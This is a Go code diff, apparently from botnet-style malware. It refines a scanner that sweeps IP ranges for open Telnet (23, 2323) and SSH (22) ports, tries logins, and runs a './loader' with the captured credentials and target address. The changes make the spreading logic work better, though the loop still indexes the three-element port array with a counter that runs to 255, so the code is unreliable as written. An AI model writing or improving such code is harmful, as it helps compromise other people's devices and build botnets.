@@ -124,7 +124,7 @@ func isTelnetOpen(ip string,port string) {
 						}
 						go func(){
 							fmt.Println("execute this file")
-							cmd:=exec.Command("./loader "+user+" "+password+" "+ip+" "+port)
+							cmd:=exec.Command("./loader",user,password,ip,port)
 							cmd.Run()
 						}()
 						return 
@@ -296,15 +296,16 @@ func checkPort(ip string, port int) bool {
 
 func Scanner() {
 	port:=[3]int{22,23,2323}
-	for i := 1; i <= 255; i++ {
+	for i := 0; i <= 255; i++ {
 		for j := 1; j <= 255; j++ {
 			ip := generateIP(i,j)
 			for k:=0 ; k<len(port) ; k++{
-				checkPort(ip,port[j])
-				if port[j]==23 || port[j]==2323{
-					isTelnetOpen(ip,intToString(port[j]))
-				}else{
-					isSSHOpen(ip)
+				if checkPort(ip,port[j]){
+					if port[j]==23 || port[j]==2323{
+						isTelnetOpen(ip,intToString(port[j]))
+					}else{
+						isSSHOpen(ip)
+					}
 				}
 			}
 		}
@@ -313,19 +314,16 @@ func Scanner() {
  
 }
 func intToString(num int) string {
-	// Handle the special case of 0 separately
+
 	if num == 0 {
 		return "0"
 	}
 
-	// Determine the sign of the number
 	sign := ""
 	if num < 0 {
 		sign = "-"
 		num = -num
 	}
-
-	// Convert each digit to its corresponding ASCII character
 	var digits []byte
 	for num > 0 {
 		digit := '0' + byte(num%10)
